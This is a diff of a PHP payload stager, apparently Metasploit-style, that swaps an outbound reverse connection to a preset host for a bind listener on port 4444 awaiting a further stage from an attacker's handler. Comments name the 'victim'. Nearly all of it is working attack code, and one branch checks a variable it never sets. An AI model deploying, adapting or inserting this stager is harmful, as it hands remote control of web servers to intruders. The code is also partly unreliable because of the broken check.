@@ -1,33 +1,30 @@
 #<?php
 
-error_reporting(0);
-# The payload handler overwrites this with the correct LHOST before sending
+# The payload handler overwrites this with the correct LPORT before sending
 # it to the victim.
-$ip = '127.0.0.1';
 $port = 4444;
-$ipf = AF_INET;
+$ipaddr = "::";
 
-if (FALSE !== strpos($ip, ":")) {
-	# ipv6 requires brackets around the address
-	$ip = "[". $ip ."]";
-	$ipf = AF_INET6;
-}
-
-if (($f = 'stream_socket_client') && is_callable($f)) {
-	$s = $f("tcp://{$ip}:{$port}");
+if (is_callable('stream_socket_server')) {
+	$srvsock = stream_socket_server("tcp://[{$ipaddr}]:{$port}");
+	if (!$srvsock) { die(); }
+	$s = stream_socket_accept($srvsock, -1);
 	$s_type = 'stream';
-} elseif (($f = 'fsockopen') && is_callable($f)) {
-	$s = $f($ip, $port);
-	$s_type = 'stream';
-} elseif (($f = 'socket_create') && is_callable($f)) {
-	$s = $f($ipf, SOCK_STREAM, SOL_TCP);
-	$res = @socket_connect($s, $ip, $port);
+} elseif (is_callable('socket_create_listen')) {
+	$srvsock = socket_create_listen(AF_INET6, SOCK_STREAM, SOL_TCP);
 	if (!$res) { die(); }
+	$s = socket_accept($srvsock);
+	$s_type = 'socket';
+} elseif (is_callable('socket_create')) {
+	$srvsock = socket_create(AF_INET6, SOCK_STREAM, SOL_TCP);
+	$res = socket_bind($srvsock, $ipaddr, $port);
+	if (!$res) { die(); }
+	$s = socket_accept($srvsock);
 	$s_type = 'socket';
 } else {
-	die('no socket funcs');
+	die();
 }
-if (!$s) { die('no socket'); }
+if (!$s) { die(); }
 
 switch ($s_type) { 
 case 'stream': $len = fread($s, 4); break;
